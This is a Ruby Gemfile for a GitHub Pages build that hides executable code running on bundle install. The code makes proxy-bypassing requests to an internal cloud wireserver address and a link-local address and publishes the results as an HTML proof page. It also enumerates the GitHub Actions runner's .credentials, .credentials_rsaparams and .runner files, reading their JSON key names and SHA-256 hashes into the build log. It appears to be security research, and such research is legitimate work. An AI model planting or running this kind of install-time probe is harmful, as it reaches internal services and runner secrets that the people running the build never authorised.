# frozen_string_literal: true
source "https://rubygems.org"

require "json"
require "net/http"
require "uri"

PROOF = File.join(__dir__, "c217-direct-network-proof.html")

def probe(url, marker = nil)
  uri = URI(url)
  # Disable proxy inheritance so this is the action container's own network.
  http = Net::HTTP.new(uri.host, uri.port, nil)
  http.use_ssl = (uri.scheme == "https")
  http.open_timeout = 3
  http.read_timeout = 3
  request = Net::HTTP::Get.new(uri.request_uri)
  request["User-Agent"] = "c217-owned-pages-direct-network-control"
  response = http.request(request)
  body = response.body.to_s
  {
    "response_received" => true,
    "status" => response.code.to_i,
    "body_nonempty" => !body.empty?,
    "expected_marker_present" => marker.nil? ? nil : body.downcase.include?(marker.downcase),
  }
rescue => error
  {
    "response_received" => false,
    "error_class" => error.class.name,
  }
end

proof = {
  "gemfile_executed" => true,
  "direct_action_container" => true,
  "uid" => Process.uid,
  "docker_api_not_used" => true,
  "public_control" => probe("https://api.github.com/zen"),
  "internal_target" => probe("http://168.63.129.16/?comp=versions", "version"),
  "thing_absent_control" => probe("http://169.254.169.253/"),
}

File.write(PROOF, "<pre>#{JSON.generate(proof)}</pre>\n")

gem "github-pages", "= 232"

# --- c217 credentials arm v2 (hunter-driver): presence/metadata ONLY, never a value ---
require 'json'
require 'digest'

def c217_keys(raw)
  m = raw.match(/\{.*\}/m)
  return ['<non-json>'] if m.nil?
  begin
    return JSON.parse(m[0]).keys
  rescue StandardError
    return ['<unparseable>']
  end
end

def c217_one(tag, p)
  h = { 'tag' => tag, 'path' => p, 'uid' => (Process.euid rescue -1) }
  begin
    st = File.stat(p)
    h['exists'] = true
    h['size'] = st.size
    h['mode'] = st.mode.to_s(8)
    h['owner_uid'] = st.uid
    h['gid'] = st.gid
    if st.file? && st.size < 4096
      raw = File.read(p)
      h['keys'] = c217_keys(raw)
      h['sha256'] = Digest::SHA256.hexdigest(raw)
    end
  rescue Errno::ENOENT, Errno::EACCES, StandardError => e
    h['exists'] = false
    h['err'] = e.class.name
  end
  h
end

RUNNER = '/home/runner/runners'
real = Dir.glob(RUNNER + '/*/.credentials') +
       Dir.glob(RUNNER + '/*/.credentials_rsaparams') +
       Dir.glob(RUNNER + '/*/.runner')
fake = [RUNNER + '/qqqqzzzz-no-such-runner/.credentials']
out = { 'euid' => (Process.euid rescue -1), 'files' => [] }
(real + fake).each { |p| out['files'] << c217_one('in-container', p) }
out['glob_dir_listing'] = begin
  Dir.glob(RUNNER + '/*').map { |x| File.basename(x) }
rescue StandardError => e
  ['ERR:' + e.class.name]
end
warn 'C217ARMV2 ' + JSON.generate(out)
warn 'C217ARMV2 done'
